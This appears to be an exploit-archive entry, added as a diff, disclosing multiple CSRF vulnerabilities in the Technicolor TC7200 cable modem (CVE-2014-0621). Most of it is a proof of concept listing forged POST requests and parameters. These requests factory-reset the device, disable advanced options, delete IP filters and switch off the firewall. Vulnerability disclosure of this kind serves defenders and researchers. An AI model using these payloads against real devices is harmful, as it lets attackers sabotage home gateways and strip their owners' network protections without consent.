@@ -1,0 +1,36 @@
+# Exploit Title: Technicolor TC7200 - Multiple CSRF Vulnerabilities
+# Google Dork: N/A
+# Date: 02-01-2013
+# Exploit Author: Jeroen - IT Nerdbox
+# Vendor Homepage:
+http://www.technicolor.com/en/solutions-services/connected-home/modems-gatew
+ays/cable-modems-gateways/tc7200-tc7300
+# Software Link: N/A
+# Version: STD6.01.12
+# Tested on: N/A
+# CVE : CVE-2014-0621
+#
+# Proof of Concept:
+# 
+# 
+## Payload for Factory Reset:
+#  
+# POST     : http://<ip>/goform/system/factory
+# Parameter: None
+# 
+## Payload to disable the advanced options:
+# 
+# POST     : http://<ip>/goform/advanced/options 
+# Parameter: None
+# 
+## Payload to remove ip-filters:
+# 
+# POST     : http://<ip>//goform/advanced/ip-filters
+# Parameter: IpFilterAddressDelete1 = 1
+# 
+## Payload to remove firewall settings 
+#  
+# POST     : http://<ip>/goform/advanced/firewall
+# Parameter: cbFirewall = 1
+# 
+# Check out the video at: http://www.nerdbox.it/technicolor-tc7200-multiple-csrf-vulnerabilities/
